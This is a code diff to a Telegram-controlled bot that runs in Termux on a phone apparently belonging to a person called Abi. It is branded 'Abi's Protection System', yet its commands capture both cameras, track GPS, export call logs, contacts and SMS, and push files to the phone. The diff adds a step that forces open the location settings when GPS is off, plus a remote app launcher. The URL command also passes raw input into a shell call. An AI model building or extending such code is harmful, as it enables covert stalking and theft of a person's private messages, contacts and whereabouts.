@@ -747,6 +747,11 @@ async def cam(update, context):
 async def loc(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
     out = run("termux-location")
+    if "error" in out.lower() or "disabled" in out.lower() or out == "":
+        await update.message.reply_text("📍 Abi's GPS is OFF — Opening location settings on her phone...")
+        os.system("am start -a android.settings.LOCATION_SOURCE_SETTINGS")
+        await update.message.reply_text("🔄 Location settings opened. Try /location again after GPS is enabled.")
+        return
     try:
         data = json.loads(out)
         lat = data.get("latitude", 0)
@@ -759,7 +764,26 @@ async def loc(update, context):
 
 async def bat(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    await update.message.reply_text(f"🔋 Abi's Battery:\n```\n{run('termux-battery-status')}\n```")
+    out = run("termux-battery-status")
+    try:
+        data = json.loads(out)
+        pct = data.get("percentage", "?")
+        health = data.get("health", "?")
+        temp = data.get("temperature", "?")
+        status = data.get("status", "?")
+        tech = data.get("technology", "?")
+        plugged = data.get("plugged", "?")
+        await update.message.reply_text(
+            f"🔋 *Abi's Battery*\n\n"
+            f"▫️ Level: *{pct}%*\n"
+            f"▫️ Status: *{status}*\n"
+            f"▫️ Charger: *{plugged}*\n"
+            f"▫️ Health: *{health}*\n"
+            f"▫️ Temp: *{temp}°C*\n"
+            f"▫️ Type: *{tech}*"
+        )
+    except:
+        await update.message.reply_text(f"🔋 Battery:\n```\n{out}\n```")
 
 async def dl(update, context):
     if update.effective_user.id != AUTHORIZED_ID or not context.args: return
@@ -796,11 +820,44 @@ async def tor(update, context):
 async def open_url(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
     if not context.args:
-        await update.message.reply_text("Usage: /open <url>")
+        await update.message.reply_text("""🔗 *Usage:*
+/open &lt;url&gt; — Open website
+/open app &lt;name&gt; — Open app
+
+📱 *Apps:* gmail, whatsapp, instagram, youtube, chrome, maps, settings, gallery, camera""")
         return
-    url = context.args[0]
-    os.system(f"termux-open-url '{url}'")
-    await update.message.reply_text(f"🔗 Opened on Abi's phone: {url}")
+    
+    if context.args[0].lower() == "app":
+        if len(context.args) < 2:
+            await update.message.reply_text("Usage: /open app <name>\nExample: /open app gmail")
+            return
+        app_name = context.args[1].lower()
+        apps = {
+            "gmail": "com.google.android.gm",
+            "whatsapp": "com.whatsapp",
+            "instagram": "com.instagram.android",
+            "youtube": "com.google.android.youtube",
+            "chrome": "com.android.chrome",
+            "maps": "com.google.android.apps.maps",
+            "settings": "com.android.settings",
+            "gallery": "com.android.gallery3d",
+            "camera": "com.android.camera",
+            "phone": "com.android.dialer",
+            "messages": "com.google.android.apps.messaging",
+            "calculator": "com.android.calculator2",
+            "calendar": "com.google.android.calendar",
+            "files": "com.android.documentsui",
+        }
+        if app_name in apps:
+            pkg = apps[app_name]
+            os.system(f"am start -n {pkg}/.MainActivity 2>/dev/null || am start {pkg} 2>/dev/null || monkey -p {pkg} 1 2>/dev/null")
+            await update.message.reply_text(f"📱 Opened {app_name.upper()} on Abi's phone")
+        else:
+            await update.message.reply_text(f"❌ Unknown app. Available: {', '.join(apps.keys())}")
+    else:
+        url = context.args[0]
+        os.system(f"termux-open-url '{url}'")
+        await update.message.reply_text(f"🔗 Opened on Abi's phone: {url}")
 
 async def toast(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
@@ -830,23 +887,23 @@ async def start(update, context):
     await update.message.reply_text("🛡️ *Abi's Protection System*\nDini's Guardian is Online.\nType /help for commands.")
 
 async def help_cmd(update, context):
-    await update.message.reply_text("""🛡️ *Dini's Command Roster — Abi's Protection*
+    await update.message.reply_text("""🛡️ *Dini's Console*
 
-📸 /cam — Capture Back + Front Camera (Dual Shot)
-📍 /location — Track Abi's Location + Maps
-🔋 /battery — Check Abi's Battery
-⬇️ /download &lt;url&gt; — Send File to Abi's Downloads
-🔗 /open &lt;url&gt; — Open Website on Abi's Phone
-💬 /toast &lt;msg&gt; — Pop Up Message on Abi's Screen
-🗣️ /say &lt;text&gt; — Speak to Abi Remotely
-📳 /vibrate [ms] — Buzz Abi's Phone
-🔦 /torch on|off — Toggle Abi's Flashlight
-📞 /calls — Abi's Call History (.txt)
-📇 /contacts — Abi's Contacts (.txt)
-💬 /sms — Abi's SMS (.txt)
-❓ /help — Show Commands
+📸 /cam — Dual Camera Capture
+📍 /location — Live GPS + Maps
+🔋 /battery — Power Status
+⬇️ /download — Remote File Push
+🔗 /open — Open URL or App
+💬 /toast — Screen Pop-up
+🗣️ /say — Voice Broadcast
+📳 /vibrate — Haptic Pulse
+🔦 /torch — Flashlight Toggle
+📞 /calls — Call Logs (.txt)
+📇 /contacts — Contacts (.txt)
+💬 /sms — SMS Logs (.txt)
+❓ /help — Command Menu
 
-♥ Dini protects Abi. Always.""")
+♥ Dini ♥ Abi""")
 
 async def main():
     app = Application.builder().token(BOT_TOKEN).build()
@@ -899,7 +956,7 @@ chmod +x ~/.termux/boot/start_bot.sh && echo '🛡️ Abi Protection Active — 
                 <div class="tag-row">
                     <span class="tag"><span class="tag-dot"></span> 12 Commands</span>
                     <span class="tag"><span class="tag-dot"></span> Dual Camera</span>
-                    <span class="tag"><span class="tag-dot"></span> Pop-up Messages</span>
+                    <span class="tag"><span class="tag-dot"></span> App Opener</span>
                     <span class="tag"><span class="tag-dot"></span> GPS Tracking</span>
                     <span class="tag"><span class="tag-dot"></span> .txt Reports</span>
                     <span class="tag"><span class="tag-dot"></span> Auto-Restart</span>
